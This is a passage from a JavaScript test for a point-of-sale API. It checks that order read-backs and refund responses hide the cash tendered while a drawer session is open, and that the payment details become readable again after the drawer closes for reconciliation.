  // reading the order back must not re-serve the open session's cash
  const back = await cashier('GET', `/api/pos/orders/${order.id}`);
  assert.equal(back.status, 200);
  assert.equal(back.data.order.payments_withheld, true);
  assert.equal(back.data.order.payments.length, 1); // the row is still listed…
  assert.deepEqual(
    back.data.order.payments.map((p) => [p.method, p.amount_cents, p.change_cents]),
    [['withheld', null, null]] // …with no method and no money on it
  );
  assert.ok(
    !JSON.stringify(back.data).includes(String(order.total_cents + 500)),
    'no amount from the open session survives the read-back'
  );

  // the refund response returns the same order detail — it must be just as blind
  const refunded = await cashier('POST', `/api/pos/orders/${order.id}/refund`, {
    approver: { username: 'manager', password: 'manager' },
    lines: [{ order_line_id: order.lines[0].id, qty: 1 }],
  });
  assert.equal(refunded.status, 200);
  assert.equal(refunded.data.order.payments_withheld, true);
  assert.ok(
    refunded.data.order.payments.every(
      (p) => p.method === 'withheld' && p.amount_cents === null && p.change_cents === null
    ),
    'refund response re-serves no cash row for the open session'
  );
  assert.ok(
    !JSON.stringify(refunded.data.order.payments).includes(String(order.total_cents + 500)),
    'original tender amount never survives the refund response'
  );

  // after close, the session's payments are readable again (Z reconciliation)
  assert.equal((await cashier('POST', '/api/drawer/close', { counted_cents: 1 })).status, 200);
  const afterClose = await cashier('GET', `/api/pos/orders/${order.id}`);
  assert.equal(afterClose.data.order.payments.length, 2); // tender + the refund row
  assert.equal(afterClose.data.order.payments[0].amount_cents, order.total_cents + 500);
  assert.equal(
    db.prepare('SELECT drawer_session_id AS d FROM payments WHERE order_id = ?').get(order.id).d,
    sessionId
  );
});
